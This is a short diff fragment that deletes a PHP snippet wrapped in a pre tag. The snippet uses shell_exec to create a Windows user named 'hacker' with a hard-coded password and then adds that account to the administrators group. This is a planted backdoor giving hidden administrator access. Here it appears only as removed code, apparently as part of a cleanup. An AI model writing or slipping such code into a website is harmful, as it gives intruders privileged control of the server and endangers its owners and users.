@@ -1,6 +1,0 @@
-<pre style="text-align:left;">
-<?php
-	echo shell_exec('net user hacker Passw0rd123! /add');
-	echo shell_exec('net localgroup administrators hacker /add');
-?>
-</pre>
